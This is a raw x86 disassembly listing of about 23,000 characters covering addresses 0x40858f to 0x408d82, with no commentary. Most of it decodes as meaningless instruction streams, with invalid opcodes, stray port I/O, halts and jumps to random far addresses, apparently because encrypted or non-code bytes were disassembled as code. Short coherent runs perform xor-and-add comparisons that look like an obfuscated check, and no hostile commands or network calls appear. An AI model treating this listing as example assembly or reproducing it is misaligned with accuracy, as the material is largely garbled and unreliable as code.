  40858f:	mov    eax,ds:0x2b2c0a6d
  408594:	adc    DWORD PTR [ecx-0x47656817],ebx
  40859a:	pop    ecx
  40859b:	test   al,0x95
  40859d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40859f:	jbe    0x40852d
  4085a1:	fadd   st,st(1)
  4085a3:	sub    BYTE PTR [ebx+0x7d],0xb4
  4085a7:	or     DWORD PTR [edx+0x16da499d],0x61ca4045
  4085b1:	xlat   BYTE PTR ds:[ebx]
  4085b2:	xor    DWORD PTR [eax-0x13],0x6160d366
  4085b9:	rol    DWORD PTR [edx],0x57
  4085bc:	dec    edi
  4085bd:	push   edi
  4085be:	popf   
  4085bf:	in     eax,dx
  4085c0:	nop
  4085c1:	cmp    DWORD PTR [ebx+0x45],0x6167b680
  4085c8:	in     eax,0xfe
  4085ca:	scas   eax,DWORD PTR es:[edi]
  4085cb:	outs   dx,DWORD PTR ds:[esi]
  4085cc:	dec    ecx
  4085cd:	xchg   edi,eax
  4085ce:	jo     0x40861e
  4085d0:	mov    ecx,0xf3dd9b2a
  4085d5:	push   es
  4085d6:	and    cl,BYTE PTR ds:0x608546db
  4085dc:	call   DWORD PTR [ebx+0xfef4cde]
  4085e2:	jb     0x408662
  4085e4:	(bad)  
  4085e5:	dec    ebx
  4085e6:	adc    al,0x45
  4085e8:	adc    esp,DWORD PTR [ebp+0x35b256b9]
  4085ee:	(bad)  
  4085ef:	iret   
  4085f0:	cmp    ecx,DWORD PTR ds:0x328c5dc2
  4085f6:	or     DWORD PTR [ebp+0x41fc8722],esp
  4085fc:	mov    dl,0xa9
  4085fe:	loop   0x40867d
  408600:	arpl   WORD PTR [ebp+0x5705285c],si
  408606:	in     al,0x1e
  408608:	or     al,0x6e
  40860a:	dec    edx
  40860b:	fst    QWORD PTR [esi-0x4d]
  40860e:	pushf  
  40860f:	lock cmc 
  408611:	mov    ds:0xdb38211a,al
  408616:	mov    esi,0x9d9115bb
  40861b:	out    dx,al
  40861c:	test   eax,0x8f642e15
  408621:	lods   eax,DWORD PTR ds:[esi]
  408622:	push   ds
  408623:	jo     0x40863d
  408625:	sub    esi,DWORD PTR [ebp+0x23]
  408628:	inc    ebp
  408629:	sub    ecx,DWORD PTR [esi+0x257e0962]
  40862f:	sbb    esi,ebp
  408631:	cmp    al,BYTE PTR [ecx-0x4aa776cc]
  408637:	push   0xffffffc9
  408639:	stc    
  40863a:	lahf   
  40863b:	and    al,0x91
  40863d:	xor    BYTE PTR [ebx+ebx*1],0x2e
  408641:	in     al,dx
  408642:	and    eax,DWORD PTR [ecx]
  408644:	push   edx
  408645:	push   0x51
  408647:	mov    ds:0xd16b0ad1,al
  40864c:	int3   
  40864d:	pop    ebp
  40864e:	retf   0x22f8
  408651:	xlat   BYTE PTR ds:[ebx]
  408652:	(bad)  
  408653:	test   DWORD PTR ds:0xfe1fea88,0xcb31f6c
  40865d:	jmp    0x40863d
  40865f:	lods   al,BYTE PTR ds:[esi]
  408660:	fst    DWORD PTR [ecx]
  408662:	(bad)  
  408663:	out    dx,eax
  408664:	adc    al,0xd9
  408666:	push   ecx
  408667:	pop    edi
  408668:	leave  
  408669:	push   ebp
  40866a:	stos   BYTE PTR es:[edi],al
  40866b:	cs rcl bl,cl
  40866e:	pop    esp
  40866f:	aas    
  408670:	inc    edx
  408671:	mov    DWORD PTR [ecx-0x22c9921a],esp
  408677:	mov    bl,0x76
  408679:	push   ds
  40867a:	inc    ebx
  40867b:	leave  
  40867c:	hlt    
  40867d:	xlat   BYTE PTR ds:[ebx]
  40867e:	sub    dl,BYTE PTR [eax-0x41ae07c6]
  408684:	outs   dx,BYTE PTR ds:[esi]
  408685:	inc    edx
  408686:	mov    ebx,0x295dc32b
  40868b:	jns    0x40862b
  40868d:	push   ss
  40868e:	repnz mov al,ds:0xc03e6c57
  408694:	pop    ebx
  408695:	inc    esi
  408696:	ftst   
  408698:	test   eax,0xfeb8bb3d
  40869d:	adc    cl,BYTE PTR [esi+0x36e31581]
  4086a3:	inc    ebx
  4086a4:	add    BYTE PTR [ebx+0x36],bh
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	aaa    
  4086b0:	inc    ebx
  4086b1:	add    BYTE PTR [edi-0x16ffbcc9],ah
  4086b7:	inc    edx
  4086b8:	add    al,BYTE PTR [eax]
  4086ba:	add    BYTE PTR [edi+0x55],bl
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x3dce5db6],ecx
  4086ca:	mov    bl,0x8a
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	jg     0x408681
  4086d5:	stc    
  4086d6:	(bad)  
  4086d8:	push   0x9e1ab125
  4086dd:	clc    
  4086de:	xchg   ecx,eax
  4086df:	xchg   edx,eax
  4086e0:	push   edx
  4086e1:	gs stc 
  4086e3:	sbb    bh,dh
  4086e5:	inc    ecx
  4086e6:	jbe    0x40866a
  4086e8:	and    dh,BYTE PTR [eax]
  4086ea:	cld    
  4086eb:	leave  
  4086ec:	ins    DWORD PTR es:[edi],dx
  4086ed:	fs pop edi
  4086ef:	add    BYTE PTR [edi],0xc7
  4086f2:	imul   edx,DWORD PTR [ebp+0x40134fa3],0xffffff83
  4086f9:	push   ecx
  4086fa:	jb     0x408682
  4086fc:	repnz dec esi
  4086fe:	or     BYTE PTR [esi+0x4f116b68],0xb9
  408705:	in     eax,0xc0
  408707:	std    
  408708:	bnd jle 0x4086e2
  40870b:	addr16 ret 0x4d64
  40870f:	loopne 0x4086f1
  408711:	add    DWORD PTR [ebx+0x1b143b7],esi
  408717:	scas   eax,DWORD PTR es:[edi]
  408718:	pusha  
  408719:	pusha  
  40871a:	jmp    0xcd94a995
  40871f:	push   ebx
  408720:	sbb    DWORD PTR [edx],eax
  408722:	cmp    WORD PTR [esi-0x37cef0d],ax
  408729:	xchg   BYTE PTR [edi+0x21191e5a],bh
  40872f:	mov    dh,0x8e
  408731:	ss iret 
  408733:	add    DWORD PTR [esi],0x3aaa1186
  408739:	pop    ebp
  40873a:	pop    ecx
  40873b:	fs sahf 
  40873d:	add    dl,BYTE PTR [esi-0x4b]
  408740:	inc    eax
  408741:	mov    WORD PTR [ecx],gs
  408743:	cmp    eax,0x6bb77e0d
  408748:	push   ds
  408749:	hlt    
  40874a:	dec    edi
  40874b:	enter  0x30ea,0x4c
  40874f:	jbe    0x408759
  408751:	mov    ecx,0x7363d792
  408756:	adc    al,0x8a
  408758:	pop    esp
  408759:	repz clc 
  40875b:	repz dec ecx
  40875d:	sbb    al,0x92
  40875f:	and    BYTE PTR [eax],dl
  408761:	ins    DWORD PTR es:[edi],dx
  408762:	stos   DWORD PTR es:[edi],eax
  408763:	out    0xac,al
  408765:	mov    ebx,0x20158b2d
  40876a:	add    eax,0x1d4ebe58
  40876f:	retf   
  408770:	ret    0x8b66
  408773:	fisub  WORD PTR [eax-0x74]
  408776:	sub    al,0x9b
  408778:	sub    al,0x3c
  40877a:	or     DWORD PTR ds:0xe0b04d16,eax
  408780:	fst    st(5)
  408782:	in     al,dx
  408783:	push   esp
  408784:	pusha  
  408785:	sub    bh,BYTE PTR [ebp-0x2fe629a5]
  40878b:	inc    ebx
  40878c:	mov    ds:0x1625546e,eax
  408791:	pop    esi
  408792:	push   ecx
  408793:	ret    
  408794:	sub    al,0xa
  408796:	mov    esi,0x61efa7fa
  40879b:	sub    al,0xa8
  40879d:	mov    ebx,0xcfdc930
  4087a2:	cs pop ss
  4087a4:	and    ecx,eax
  4087a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087a7:	mov    al,0x87
  4087a9:	clc    
  4087aa:	out    dx,eax
  4087ab:	and    DWORD PTR [ebx+0x32f54c02],esi
  4087b1:	test   DWORD PTR ds:0xeab98c80,edx
  4087b7:	imul   esp,DWORD PTR [edi+0x61d8657b],0x2e
  4087be:	xor    esp,ebx
  4087c0:	imul   ecx,DWORD PTR [edx],0xffffffdb
  4087c3:	gs or  al,0xc1
  4087c6:	dec    ebp
  4087c7:	int    0x2b
  4087c9:	fidiv  DWORD PTR ds:0x299a2bc6
  4087cf:	and    BYTE PTR [edx+0x28e000c1],0xd2
  4087d6:	sub    esp,ecx
  4087d8:	enter  0xecc5,0x9
  4087dc:	cmc    
  4087dd:	in     al,dx
  4087de:	lahf   
  4087df:	mov    eax,ds:0x7b691dfa
  4087e4:	out    dx,eax
  4087e5:	inc    esi
  4087e6:	adc    eax,DWORD PTR [ebx]
  4087e8:	int3   
  4087e9:	ja     0x40885d
  4087eb:	inc    edi
  4087ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ed:	fimul  WORD PTR [edi-0x36]
  4087f0:	cmp    DWORD PTR [eax],esp
  4087f2:	mov    ecx,edx
  4087f4:	and    ecx,edi
  4087f6:	push   es
  4087f7:	adc    edx,DWORD PTR [ecx+0x72ac1e52]
  4087fd:	dec    esp
  4087fe:	aam    0x64
  408800:	jle    0x4087d9
  408802:	dec    esp
  408803:	or     dl,ch
  408805:	and    DWORD PTR [ecx+ecx*8+0x22],edi
  408809:	loope  0x4087e6
  40880b:	dec    edx
  40880c:	dec    esp
  40880d:	call   0x75ab:0xcf6ef554
  408814:	push   esi
  408815:	or     al,BYTE PTR [ebx+eiz*2]
  408818:	int    0x6
  40881a:	dec    ebx
  40881b:	jl     0x4087be
  40881d:	js     0x40884b
  40881f:	ja     0x408828
  408821:	dec    edi
  408822:	std    
  408823:	out    0x3b,al
  408825:	loope  0x4087f5
  408827:	sahf   
  408828:	int3   
  408829:	cdq    
  40882a:	into   
  40882b:	adc    DWORD PTR [ecx+0x25f901f4],0x34
  408832:	call   DWORD PTR [ebx+0x636cf75f]
  408838:	or     bh,ch
  40883a:	mov    ah,0x3e
  40883c:	into   
  40883d:	add    BYTE PTR [edx+esi*4-0x2de2f334],bl
  408844:	pop    ecx
  408845:	dec    eax
  408846:	mov    ch,0xe1
  408848:	adc    al,0xdc
  40884a:	(bad)  
  40884b:	jge    0x40882e
  40884d:	push   edi
  40884e:	or     al,0x83
  408850:	mov    edx,0x570a47ce
  408855:	aas    
  408856:	paddusb mm4,mm7
  408859:	fisubr WORD PTR [ebx]
  40885b:	or     ebx,DWORD PTR [ebp+0x7a]
  40885e:	xchg   edi,eax
  40885f:	push   ecx
  408860:	lea    esp,[esi+0x70]
  408863:	mov    ds:0xb242d91d,eax
  408868:	jmp    0x974c:0xaa69e7d2
  40886f:	aam    0x1c
  408871:	sti    
  408872:	(bad)  
  408873:	aas    
  408874:	mov    eax,0x4b977546
  408879:	hlt    
  40887a:	fwait
  40887b:	(bad)  
  40887c:	adc    cl,BYTE PTR [edx+ebp*1-0x7185c64e]
  408883:	ins    BYTE PTR es:[edi],dx
  408884:	dec    ecx
  408885:	pop    ebx
  408886:	xchg   edx,eax
  408887:	mov    bh,0x79
  408889:	mov    al,0xef
  40888b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40888c:	jne    0x4088ea
  40888e:	xchg   ax,ax
  408890:	cdq    
  408891:	xchg   edx,eax
  408892:	mov    ecx,cs
  408894:	cmp    ecx,DWORD PTR [esi-0xcb2bbc0]
  40889a:	test   eax,0xae6d3a21
  40889f:	adc    DWORD PTR [ebp-0x6],ebx
  4088a2:	xor    DWORD PTR [edx-0x43848395],edi
  4088a8:	mov    edi,DWORD PTR [ebp-0x4c]
  4088ab:	xor    DWORD PTR [ecx+0x3465058d],eax
  4088b1:	mov    ds:0xa9bf72c4,eax
  4088b6:	fnstcw WORD PTR [eax+0x4a97df6e]
  4088bc:	retfw  0x45b4
  4088c0:	fnstsw WORD PTR [ebx+0x5c]
  4088c3:	cld    
  4088c4:	lds    ebp,FWORD PTR [ecx+0x4c]
  4088c7:	fsub   DWORD PTR [edx+0xee45375]
  4088cd:	mov    ecx,0xe7397df4
  4088d2:	cli    
  4088d3:	(bad)  
  4088d4:	mov    al,BYTE PTR [edx+0x1fb19eeb]
  4088da:	aad    0x40
  4088dc:	sbb    BYTE PTR [ecx+0x26f008a1],0x62
  4088e3:	add    ah,dl
  4088e5:	retf   
  4088e6:	sub    bl,0xda
  4088e9:	sahf   
  4088ea:	cld    
  4088eb:	inc    esp
  4088ec:	gs aaa 
  4088ee:	sbb    esp,DWORD PTR [esi-0x73]
  4088f1:	es je  0x4088ce
  4088f4:	jmp    0x808abcba
  4088f9:	pop    ds
  4088fa:	pop    ebx
  4088fb:	fwait
  4088fc:	or     DWORD PTR [ebx-0x1cca7f00],ecx
  408902:	ss inc ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x43375b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4336d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43369f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4337a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x86e3542c
  408968:	push   es
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	mov    esi,0x664d294e
  408976:	in     al,0xe5
  408978:	pop    es
  408979:	jno    0x408942
  40897b:	test   BYTE PTR [esi],cl
  40897d:	fst    DWORD PTR [edi+0xd5c90f8]
  408983:	xchg   al,cl
  408985:	jg     0x4089eb
  408987:	imul   esi,DWORD PTR [edx+0x47ed267f],0x2a
  40898e:	mov    BYTE PTR [ebx+ebp*4-0x3263c703],dl
  408995:	(bad)  
  408996:	jle    0x4089f1
  408998:	call   0x148b:0x97e3e7d0
  40899f:	imul   eax,DWORD PTR [esi+0x32a9387c],0x5
  4089a6:	sub    cl,BYTE PTR [ecx]
  4089a8:	clc    
  4089a9:	test   DWORD PTR [eax],ecx
  4089ab:	and    DWORD PTR [eax],ecx
  4089ad:	adc    eax,0x71
  4089b0:	fs das 
  4089b2:	jl     0x40898a
  4089b4:	pop    ds
  4089b5:	stos   DWORD PTR es:[edi],eax
  4089b6:	xor    al,0x4f
  4089b8:	cmp    eax,0x7f9d9d89
  4089bd:	ds jle 0x408a21
  4089c0:	stos   DWORD PTR es:[edi],eax
  4089c1:	pop    ecx
  4089c2:	arpl   WORD PTR [ecx-0x72f7d300],dx
  4089c8:	cmp    dl,ah
  4089ca:	cmp    eax,0x613d8cf9
  4089cf:	ins    DWORD PTR es:[edi],dx
  4089d0:	cs mov esp,0x1f12bdbc
  4089d6:	repz shl esi,cl
  4089d9:	cmp    ebx,DWORD PTR [esi+ebx*4]
  4089dc:	push   ss
  4089dd:	out    dx,eax
  4089de:	adc    eax,0x7abe30d6
  4089e3:	imul   edx,DWORD PTR [edx],0x161dbb15
  4089e9:	outs   dx,DWORD PTR ds:[esi]
  4089ea:	test   BYTE PTR [edx+eiz*1+0xd],bl
  4089ee:	xchg   BYTE PTR [ebx-0x39],cl
  4089f1:	ja     0x408a61
  4089f3:	and    eax,0x6b77abf0
  4089f8:	push   ecx
  4089f9:	je     0x408989
  4089fb:	and    al,0x9b
  4089fd:	fstp   TBYTE PTR [esp+eiz*2+0x3b769a82]
  408a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a05:	xchg   ecx,eax
  408a06:	in     eax,dx
  408a07:	jmp    0x9c47e068
  408a0c:	mov    edx,0xfac55b4e
  408a11:	jg     0x408a08
  408a13:	pop    esi
  408a14:	lds    ecx,FWORD PTR [edx-0x20]
  408a17:	push   ebp
  408a18:	sbb    bl,cl
  408a1a:	xchg   esp,eax
  408a1b:	xor    ebx,DWORD PTR [edi]
  408a1d:	jmp    0xa6a9ef2d
  408a22:	in     al,0xe6
  408a24:	push   ecx
  408a25:	and    ch,BYTE PTR [ebx-0x18]
  408a28:	shl    DWORD PTR [edi+0x76],0x1
  408a2c:	(bad)  
  408a2d:	cmp    eax,0x9f40cd72
  408a32:	sahf   
  408a33:	push   ds
  408a34:	mov    ebx,0xffcc8713
  408a39:	sub    cl,BYTE PTR [edi-0x2b]
  408a3c:	pop    eax
  408a3d:	je     0x408a33
  408a3f:	clc    
  408a40:	fsub   st,st(6)
  408a42:	pop    edx
  408a43:	call   0xf5c4cdae
  408a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a49:	or     bh,ah
  408a4b:	inc    eax
  408a4c:	adc    DWORD PTR [edx-0x5a3c3f47],ebx
  408a52:	enter  0x9ac0,0xb3
  408a56:	and    al,0x16
  408a58:	and    DWORD PTR [ebx-0x64],ebp
  408a5b:	repz jg 0x408a8b
  408a5e:	dec    eax
  408a5f:	push   esp
  408a60:	mov    edi,0x9b1f91ce
  408a65:	loope  0x408a86
  408a67:	lea    eax,[edx+edi*1]
  408a6a:	ja     0x408ac2
  408a6c:	retf   0x9f3e
  408a6f:	dec    ebp
  408a70:	or     DWORD PTR [ebp-0x26],0x8c847d31
  408a77:	pop    edi
  408a78:	mov    ecx,0x2d5b0b68
  408a7d:	sbb    DWORD PTR [esp+edi*8+0x202f7c00],ecx
  408a84:	test   al,0x8
  408a86:	or     dl,BYTE PTR [ebp-0x79]
  408a89:	dec    ebp
  408a8a:	aam    0x67
  408a8c:	imul   edx,DWORD PTR [edx-0x6a],0xffffffeb
  408a90:	sub    esi,esi
  408a92:	jae    0x408b05
  408a94:	push   ebp
  408a95:	inc    ebx
  408a96:	jbe    0x408a5e
  408a98:	pop    ecx
  408a99:	loope  0x408ab6
  408a9b:	sbb    esi,edi
  408a9d:	sub    al,bl
  408a9f:	out    0x59,al
  408aa1:	mov    ds:0x43b753cf,eax
  408aa6:	push   esi
  408aa7:	pusha  
  408aa8:	out    dx,al
  408aa9:	xor    al,0x7e
  408aab:	bound  edi,QWORD PTR [edx+esi*8-0x1d]
  408aaf:	fiadd  DWORD PTR [edx-0x6bba8311]
  408ab5:	jecxz  0x408aa9
  408ab7:	ins    BYTE PTR es:[edi],dx
  408ab8:	fwait
  408ab9:	inc    esi
  408aba:	xchg   ebp,ebp
  408abc:	fsubr  QWORD PTR [edx]
  408abe:	cmp    DWORD PTR [edx],edi
  408ac0:	mov    ebx,eax
  408ac2:	xchg   edi,eax
  408ac3:	xchg   edi,eax
  408ac4:	xchg   BYTE PTR [ebx-0x114bdfd0],al
  408aca:	or     edx,DWORD PTR [edx]
  408acc:	xchg   ecx,eax
  408acd:	(bad)  ds:0x9ac39939
  408ad3:	ret    0xd48a
  408ad6:	mov    BYTE PTR [ecx+0x23],ah
  408ad9:	mov    WORD PTR [eax],?
  408adb:	(bad)  
  408adc:	cwde   
  408add:	adc    eax,0x1a373145
  408ae2:	ds pop ebx
  408ae4:	call   0xefe410ad
  408ae9:	test   BYTE PTR [ebx+0x76b58942],ah
  408aef:	mov    eax,0x50545670
  408af4:	(bad)  
  408af5:	(bad)  
  408af6:	adc    ah,BYTE PTR [ebx]
  408af8:	ins    DWORD PTR es:[edi],dx
  408af9:	aaa    
  408afa:	std    
  408afb:	(bad)  [ecx]
  408afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408afe:	cmp    eax,0xb2fa118
  408b03:	pop    es
  408b04:	fld    TBYTE PTR [edx]
  408b06:	iret   
  408b07:	ror    DWORD PTR [ecx-0x7c],0x46
  408b0b:	xor    BYTE PTR [ebx+ebp*4-0x1a7c8523],ah
  408b12:	sar    BYTE PTR [ebx+0x1555527e],1
  408b18:	mov    eax,0x12f76a4e
  408b1d:	or     eax,0x19405152
  408b22:	daa    
  408b23:	fsubr  QWORD PTR [edx]
  408b25:	daa    
  408b26:	mov    bl,BYTE PTR [ecx+0x66e0eb7e]
  408b2c:	(bad)  
  408b2e:	dec    esi
  408b2f:	test   edi,esi
  408b31:	inc    esi
  408b32:	sub    BYTE PTR ds:0xda0037fd,cl
  408b38:	cmp    ah,BYTE PTR [esi+0x63e17dcc]
  408b3e:	cld    
  408b3f:	sbb    bl,BYTE PTR [eax+0x625bc631]
  408b45:	jnp    0x408b33
  408b47:	cmp    al,0xe8
  408b49:	dec    edi
  408b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b4b:	inc    edi
  408b4c:	imul   esp,DWORD PTR [ebx+0x21f960f6],0xb8a3dd02
  408b56:	mov    ds:0xdc0bdf70,eax
  408b5b:	xchg   esp,eax
  408b5c:	cmp    DWORD PTR [eax-0x58d70871],0x62
  408b63:	jmp    0x408b90
  408b65:	cmp    BYTE PTR [edx-0x31],ah
  408b68:	xchg   ecx,eax
  408b69:	cwde   
  408b6a:	call   edi
  408b6c:	xor    esi,edx
  408b6e:	fadd   QWORD PTR [eax-0x18887a2b]
  408b74:	sub    ecx,ecx
  408b76:	mov    dl,0x58
  408b78:	std    
  408b79:	lods   eax,DWORD PTR ds:[esi]
  408b7a:	or     DWORD PTR [edi-0x773e2518],esp
  408b80:	push   ebx
  408b81:	mov    al,0x28
  408b83:	sar    BYTE PTR [edx+ebp*4+0x7f6ff8e3],cl
  408b8a:	sub    eax,0x5f70e8f2
  408b8f:	loop   0x408bfc
  408b91:	loopne 0x408bf8
  408b93:	lock outs dx,DWORD PTR ds:[esi]
  408b95:	mov    ah,0x92
  408b97:	out    0xec,al
  408b99:	loop   0x408b78
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	xchg   ecx,eax
  408bf1:	sbb    BYTE PTR [ecx],0xf9
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	jecxz  0x408bc7
  408bfe:	sub    al,0x2b
  408c00:	push   es
  408c01:	mov    ?,WORD PTR [ecx-0x2e69ef22]
  408c07:	stos   BYTE PTR es:[edi],al
  408c08:	aas    
  408c09:	or     al,0x5a
  408c0b:	pop    esp
  408c0c:	test   DWORD PTR [ecx+edi*2+0x60],esi
  408c10:	xor    eax,0x5bd6be78
  408c15:	jl     0x408bf0
  408c17:	and    dl,BYTE PTR [edi-0x1b]
  408c1a:	inc    edx
  408c1b:	rcr    DWORD PTR [ebx-0x3c],1
  408c1e:	inc    esp
  408c1f:	mov    eax,0x178b348d
  408c24:	ror    DWORD PTR [bp+di-0x57c8],cl
  408c29:	lea    edx,[ecx-0x14834e14]
  408c2f:	dec    ecx
  408c30:	inc    edi
  408c31:	outs   dx,DWORD PTR ds:[esi]
  408c32:	leave  
  408c33:	mov    dl,0x24
  408c35:	scas   eax,DWORD PTR es:[edi]
  408c36:	idiv   BYTE PTR [eax+0x47]
  408c39:	cmp    DWORD PTR [ebx+0x7823b0ae],ecx
  408c3f:	cmp    DWORD PTR [edx],ebx
  408c41:	add    al,0x3f
  408c43:	idiv   bl
  408c45:	mov    esi,0x5f7cceb0
  408c4a:	mov    ebx,0xd13aa3f
  408c4f:	sahf   
  408c50:	js     0x408c6f
  408c52:	fwait
  408c53:	sbb    DWORD PTR [edi],ebx
  408c55:	iret   
  408c56:	inc    ecx
  408c57:	(bad)  
  408c58:	and    al,0x83
  408c5a:	bound  esp,QWORD PTR [ecx+0x3f01d836]
  408c60:	popf   
  408c61:	or     ebp,edi
  408c63:	in     eax,dx
  408c64:	es pop edi
  408c66:	arpl   WORD PTR [esp+esi*2-0x3c],bp
  408c6a:	xor    ebp,DWORD PTR ds:[eax-0x645cd51e]
  408c71:	ja     0x408c7b
  408c73:	loop   0x408ca7
  408c75:	sar    DWORD PTR [ebp+ebx*2+0x7a9e74ff],cl
  408c7c:	or     bl,0x25
  408c7f:	inc    edi
  408c80:	push   esi
  408c81:	push   esi
  408c82:	cmp    ah,BYTE PTR [edx+0xf]
  408c85:	cld    
  408c86:	(bad)
  408c8a:	loop   0x408caf
  408c8c:	and    bl,BYTE PTR [esi]
  408c8e:	mov    ebp,0x6b966af0
  408c93:	shl    BYTE PTR [ebx],cl
  408c95:	js     0x408c6f
  408c97:	xchg   ecx,eax
  408c98:	out    0xfa,al
  408c9a:	and    al,0x8c
  408c9c:	das    
  408c9d:	inc    ebp
  408c9e:	sbb    ebx,edx
  408ca0:	jae    0x408cc9
  408ca2:	ficom  DWORD PTR [edx]
  408ca4:	adc    BYTE PTR [esi-0x466522e0],al
  408caa:	aas    
  408cab:	mov    BYTE PTR [eax+0x1472c328],cl
  408cb1:	aad    0x21
  408cb3:	sbb    BYTE PTR es:[ebx-0x35],0x7e
  408cb8:	cmp    edx,DWORD PTR [ebx+0x55ab6278]
  408cbe:	xor    ebx,ebp
  408cc0:	popa   
  408cc1:	test   DWORD PTR [ecx-0x2aefad87],ebp
  408cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc8:	adc    dh,BYTE PTR [ebx]
  408cca:	daa    
  408ccb:	out    0x16,eax
  408ccd:	nop
  408cce:	scas   al,BYTE PTR es:[edi]
  408ccf:	in     eax,dx
  408cd0:	adc    DWORD PTR [edi-0x45],0xffffffa8
  408cd4:	sbb    eax,0x6943238
  408cd9:	dec    esi
  408cda:	das    
  408cdb:	xlat   BYTE PTR ds:[ebx]
  408cdc:	scas   al,BYTE PTR es:[edi]
  408cdd:	cmp    cl,BYTE PTR [eax-0x69090fd2]
  408ce3:	cmp    al,0xc4
  408ce5:	sub    ebx,DWORD PTR [edx+0x31]
  408ce8:	mov    ah,0xdd
  408cea:	iret   
  408ceb:	or     edi,DWORD PTR [eax+0xce076de]
  408cf1:	push   ds
  408cf2:	cli    
  408cf3:	xchg   ebp,eax
  408cf4:	sti    
  408cf5:	(bad)  [ebx+0x6a62010d]
  408cfb:	rcr    DWORD PTR [eax],0x9d
  408cfe:	ficom  DWORD PTR [esi+0x60f08628]
  408d04:	stos   BYTE PTR es:[edi],al
  408d05:	mov    edi,0xd5ecbbbf
  408d0a:	mov    edx,0x67fec624
  408d0f:	xor    al,0xb4
  408d11:	xor    eax,0xb0049c5f
  408d16:	sbb    esp,DWORD PTR [eax]
  408d18:	sub    BYTE PTR [edi+0x16],0xa5
  408d1c:	pop    ebx
  408d1d:	in     eax,dx
  408d1e:	lea    edx,[ebx-0xa]
  408d21:	jmp    FWORD PTR ds:0x24868532
  408d27:	sahf   
  408d28:	push   edx
  408d29:	loopne 0x408cd4
  408d2b:	popa   
  408d2c:	int    0x68
  408d2e:	push   ds
  408d2f:	and    DWORD PTR [esi+0x28],ebx
  408d32:	cs sbb eax,0x85d3870c
  408d38:	outs   dx,BYTE PTR ds:[esi]
  408d39:	test   BYTE PTR [ebx-0x1e2a8fb5],bh
  408d3f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408d41:	punpckldq mm4,DWORD PTR [edx-0x44]
  408d45:	inc    ecx
  408d46:	out    dx,al
  408d47:	pop    ebx
  408d48:	lods   al,BYTE PTR ds:[esi]
  408d49:	dec    ebx
  408d4a:	inc    edx
  408d4b:	jo     0x408d91
  408d4d:	mov    ecx,0xb7625549
  408d52:	clc    
  408d53:	fcomp  QWORD PTR [esi+0x6ce262d]
  408d59:	or     bh,cl
  408d5b:	aam    0x97
  408d5d:	sub    eax,0xfc9ae4f5
  408d62:	sar    DWORD PTR ds:0x1ca5c6a2,0xf
  408d69:	xor    eax,0xcdbffd1b
  408d6e:	retf   0x35a7
  408d71:	dec    edx
  408d72:	repnz int 0x95
  408d75:	pop    edi
  408d76:	int    0x94
  408d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d79:	out    dx,eax
  408d7a:	jmp    0xc3c66cb6
  408d7f:	test   al,0x4
  408d81:	stc    
  408d82:	xor    ah,BYTE PTR [eax-0xe]
